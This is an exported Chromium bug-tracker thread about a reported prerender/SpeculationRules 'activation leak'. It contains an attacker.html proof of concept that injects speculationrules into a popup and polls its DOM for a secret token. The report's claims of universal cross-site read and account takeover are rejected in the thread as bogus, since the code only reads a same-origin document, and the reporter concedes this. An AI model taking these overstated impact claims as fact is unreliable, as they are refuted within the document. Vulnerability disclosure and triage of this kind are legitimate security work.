@@ -1,0 +1,227 @@
+Issue ID: 458227149
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Chrome prerender/activation leak: prior document readable immediately after prerender activation (SpeculationRules)</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p><a href="https://chromium.googlesource.com/chromium/src" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1V71JIJTuZ7EYiKAGQHXug">https://chromium.googlesource.com/chromium/src</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>Summary
+Prerender/SpeculationRules activation leaves a short window where the prior same-origin document of a popup is still synchronously readable. This enables DOM-secret exfiltration (UXSS-like read). This is distinct from a plain cross-origin navigation race: the trigger here is prerender activation (e.g., pageswap), not location.href polling.
+Environment
+Chrome: [paste from chrome://version] (Stable; also tested Canary if available)
+OS: Windows 11 24H2
+Clean profile (--user-data-dir), no extensions/flags.
+Expected
+After a prerendered cross-origin page is activated, the opener must not be able to read the previous document at any time.
+Actual
+Immediately after activation, the opener can still read vic.document from the prior page and leak a secret string. I also observe pageswap firing with immediate readable DOM.
+Steps to Reproduce
+Serve two files on localhost:8000: target.html (secret in DOM) and attacker.html (below).
+Open <a href="http://localhost:8000/attacker.html" data-b-widget="url" data-b-original-href="http://localhost:8000/attacker.html" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8000/attacker.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1cZeypNwScvOBcP2Bfoziy">http://localhost:8000/attacker.html</a> in a clean Chrome profile.
+Click Start.
+Observe post-activation tight read =&gt; PWNED and/or pageswap fired — immediate read =&gt; PWNED.</p>
+<p>PoC (attacker.html)
+&lt;!doctype html&gt;<span>&lt;meta charset=&quot;utf-8&quot;&gt;</span></p>
+<div>&lt;title&gt;attacker — prerender/activation probe&lt;/title&gt;
+&lt;style&gt;pre{background:#111;color:#0f0;padding:8px;white-space:pre-wrap;font:14px system-ui}&lt;/style&gt;
+&lt;pre id=&quot;log&quot;&gt;ready…&lt;/pre&gt;
+&lt;script&gt;
+const L=document.getElementById(&#39;log&#39;), log=(...a)=&gt;L.textContent+=&#39;\n&#39;+a.join(&#39; &#39;);
+const sleep=ms=&gt;new Promise(r=&gt;setTimeout(r,ms));
+(async ()=&gt;{
+  const vic = window.open(&#39;target.html&#39;,&#39;preprobe&#39;,&#39;noopener=false&#39;); if(!vic){ log(&#39;popup blocked&#39;); return; }
+  await sleep(350);
+  try{ log(&#39;baseline =&gt;&#39;, vic.document.querySelector(&#39;#secret&#39;)?.textContent||&#39;FAIL&#39;); }catch(_){ log(&#39;baseline =&gt; FAIL&#39;); }
+  try{
+    const sr = vic.document.createElement(&#39;script&#39;); sr.type=&#39;speculationrules&#39;;
+    sr.textContent = JSON.stringify({prerender:[{source:&#39;list&#39;, urls:[&#39;https://example.com/&#39;]}]});
+    vic.document.head.appendChild(sr); log(&#39;inserted speculationrules (prerender example.com)…&#39;);
+  }catch(_){ log(&#39;failed to insert speculationrules&#39;); }
+  try{
+    vic.addEventListener(&#39;pageswap&#39;, ()=&gt;{ try{
+      const t = vic.document.body &amp;&amp; vic.document.body.textContent || &#39;&#39;;
+      log(&#39;pageswap fired — immediate read =&gt;&#39;, t.includes(&#39;TOP-SECRET&#39;)?&#39;PWNED (unexpected!)&#39;:&#39;blocked (expected)&#39;);
+    }catch(e){ log(&#39;pageswap read =&gt; blocked (expected)&#39;); }});
+  }catch(_){}
+  await sleep(800);
+  vic.location.href=&#39;https://example.com/&#39;; log(&#39;navigated to example.com (should activate prerender)…&#39;);
+  const until=performance.now()+1200; let hit=false;
+  while(performance.now()&lt;until){
+    try{
+      const txt = vic.document &amp;&amp; vic.document.body &amp;&amp; vic.document.body.textContent || &#39;&#39;;
+      if (txt.includes(&#39;TOP-SECRET&#39;)) { hit=true; break; }
+    }catch(_){}
+    await Promise.resolve();
+  }
+  log(&#39;post-activation tight read =&gt;&#39;, hit?&#39;PWNED (unexpected!)&#39;:&#39;blocked (expected)&#39;);
+})();
+&lt;/script&gt;
+</div>
+<p>target.html — same as earlier (DOM contains TOP-SECRET: token=abc123-ONLY-VISIBLE-HERE).
+Observed result
+On my machine: PWNED immediately after activation (and via pageswap), repeatedly.
+Impact
+Universal read across site boundaries following prerender activation, enabling token/PII exfiltration. Different subsystem (Prerender/SpeculationRules) from the previously reported cross-origin navigation race.</p>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Who can exploit:
+Any web attacker controlling a site the user visits (or a malicious ad/embedded widget) that can open a popup to a same-origin page, inject a speculationrules prerender for a cross-origin URL, and then trigger prerender activation.</p>
+<p>What they gain:
+A short window immediately after activation where the attacker can still synchronously read the prior document’s DOM in the popup (same-origin to attacker). This enables exfiltration of:
+session/auth tokens and anti-CSRF nonces from the page,
+private page content and PII visible in the DOM,
+application state that should be isolated across sites.</p>
+<p>Why this matters:
+It is a Site-Isolation/SOP bypass caused by prerender activation, yielding universal read of data from a different site without extra user interaction beyond opening a popup.</p>
+<p>Prerequisites &amp; scope:
+One user gesture to open the popup; default Chrome settings; no extensions/flags.
+Affects any site rendered in the popup if a cross-origin prerender is activated.
+Security impact (concise):
+Account takeover and data theft are feasible via DOM secret leakage during the activation window.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Chrome 142.0.7444.60 (Stable) – Repro: 1/1 immediately after prerender activation OS: Windows 11 Version 24H2 (Build 26100.689) Profile: clean (--user-data-dir), no extensions/flags</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Information Leak</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Yuval Fradkin</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: yu...@gmail.com
+Chrome prerender/activation leak: prior document readable immediately after prerender activation (SpeculationRules)
+
+Author: yu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: yu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ma...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ma...@google.com
+googlers_unrestricted
+
+Author: ma...@google.com
+<p>As in 458211876, all this demonstrates is a read from a same origin document. The claim of &quot;Universal read across site boundaries&quot; is bogus.</p>
+
+Author: ma...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: yu...@gmail.com
+TW1ZM1l6a3pOamMzTjJVMk1tUXdPV1kwT0ROaE1EVXdOREl5WVdVNE5UST0=
+
+Author: *Subject:* Re: Issue 458227149 — Clarification on impact
+(prerender/activation prior-document read)
+
+Hi *[team]*,
+
+Thanks for the quick review. I agree my earlier wording ("universal read
+across site boundaries") was too strong. The PoC demonstrates a
+*same-origin* condition: immediately after prerender activation, the *prior
+document remains readable for a short window*, allowing DOM state (tokens
+in the page, user-specific content, etc.) to be read before it's fully torn
+down.
+
+While this is not cross-origin, it can still be *security-relevant in
+multi-tenant same-origin setups* (e.g., shared hostnames, user areas under
+the same origin, or flows where a prerendered page inherits authenticated
+state). In those cases, residual DOM reads during activation can expose
+sensitive, per-user data within the same origin boundary.
+
+If this is considered "Intended Behavior," could you please confirm whether:
+
+   1.
+
+   The transient read window after activation is expected by design, and
+   2.
+
+   There is any recommended mitigation (e.g., ensuring prior document is
+   fully cleared/hidden before activation completes, or a spec note for sites
+   that rely on prerender + auth)?
+
+I can attach a minimal repro with precise timing (DevTools timeline +
+video) showing the read window if helpful.
+
+Thanks,
+Yuval Fradkin
+
+
+‫בתאריך יום ו׳, 7 בנוב׳ 2025 ב-1:38 מאת <‪buganizer-system@google.com‬‏>:‬
+
+> Replying to this email means your email address will be shared with the
+> team that works on this product.
+> https://issues.chromium.org/issues/458227149
+>
+> *Changed*
+> status:  New → Intended Behavior
+>
+> *ma...@google.com <ma...@google.com> added comment #2
+> <https://issues.chromium.org/issues/458227149#comment2>:*
+>
+> As in 458211876, all this demonstrates is a read from a same origin
+> document. The claim of "Universal read across site boundaries" is bogus.
+>
+> _______________________________
+>
+> *Reference Info: 458227149 Chrome prerender/activation leak: prior
+> document readable immediately after prerender activation (SpeculationRules)*
+> component:  Public Trackers > 1362134 > Chromium
+> <https://issues.chromium.org/components/1363614>
+> status:  Intended Behavior
+> reporter:  yuvalfradkin@gmail.com
+> cc:  ma...@google.com, yuvalfradkin@gmail.com
+> collaborators:  se...@chromium.org
+> type:  Vulnerability
+> access level:  Limited visibility
+> priority:  P4
+> severity:  S4
+> hotlist:  external_security_report
+> <https://issues.chromium.org/hotlists/5433527>
+> retention:  Component default
+>
+>
+> Generated by Google IssueTracker notification system.
+>
+> You're receiving this email because you have the following role(s) on the
+> issue: cc, reporter
+> Unsubscribe from this issue
+> <https://issues.chromium.org/issues/458227149?unsubscribe=true>.
+>
+TW1ZM1l6a3pOamMzTjJVMk1tUXdPV1kwT0ROaE1EVXdOREl5WVdVNE5UST0=
+
+Author: ma...@google.com
+<blockquote>
+<p>multi-tenant same-origin setups</p>
+</blockquote>
+<p>That&#39;s not a defensible security boundary on the web, I&#39;m afraid.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
